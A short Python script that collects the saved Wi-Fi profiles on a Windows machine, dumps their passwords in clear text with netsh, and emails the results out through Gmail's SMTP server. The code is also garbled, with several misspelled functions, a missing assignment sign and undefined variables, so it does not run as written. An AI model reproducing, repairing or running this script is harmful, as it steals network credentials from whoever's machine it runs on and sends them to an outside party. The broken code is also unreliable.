#!/usr/bin/python

import subprocess, smtplib, re


command = "netsh wlan show profile"
networks = subprocess.chec_output(command, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

output = ""
for network in network_list:
    command "netsh wlan show profile " + network + " key=clear"
    one_network_result = subprocess.check_output(command2, shell=True)
    final_output += one_network_result

#my_email = raw_input("Enter email to send to")
#password = raw_input("Enter email to send to")

server = smtpli.smpt("smtp.gmail.com", 587)
server.starttls()
server.login(email, password)
server.sendmail(my_email, my_email, final_output)

